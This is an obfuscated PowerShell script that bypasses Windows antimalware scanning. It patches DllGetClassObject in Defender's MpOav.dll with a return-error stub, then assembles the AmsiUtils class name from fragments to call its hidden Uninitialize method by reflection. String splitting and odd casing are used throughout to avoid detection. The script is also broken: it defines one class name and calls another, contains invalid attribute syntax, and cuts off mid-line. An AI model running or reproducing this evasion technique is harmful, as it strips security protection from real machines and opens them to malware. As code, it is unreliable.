$Zeus = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    ['D'+llImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    ['D'+llImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    ['D'+llImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Zeus
$z1 = "0"
$z2 = "x"
$z3 = "B"
$z4 = "8"
$zzz1 = $z1+$z1+$z3+$z4
$zzz2 = "0x57"
$zzz3 = "0x00"
$zzz4 = "0x07"
$zzz5 = "0x80"
$zzz6 = "0xC3"
$PiZaCh = [Byte[]] ($zzz1,$zzz2,$zzz3,$zzz4,+$zzz5,+$zzz6)
$LLz7 = [Zeus]::LoadLibrary("MpOav.dll")
$addy = [Zeus]::GetProcAddress($LLz7,"DllGetClassObject")
$sz = 0
[Zeus]::VirtualProtect($addy, [uint32]6, 0x40, [ref]$sz)


[sysTEM.rUntiME.iNtErOPsERvIcEs.MaRSHal]::CoPy($PiZaCh, 0, $addy, 6)

$s1 = 'Sys'
$s2 = 'tem.Ma'
$s3 = 'nag'
$s4 = 'eme'
$s5 = 'nt.'
$s6 = 'Autom'
$s7 = 'ati'
$s8 = 'on.A'
$s9 = 'm'
$s10 = 's'
$s11 = 'i'
$s12 = 'U'
$s13 = 't'
$s14 = 'i'
$s15 = 'l'
$s16 = 's'
$SSS9 = $s1 + $s2 + $s3 + $s4 + $s5 + $s6 + $s7 + $s8 + $s9 + $s10 + $s11 + $s12 + $s13 + $s14 + $s15 + $s16
$tec = [Ref].aSSembly.gettYPE($SSS9)


$ezi = $tec.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize

$ezi.In
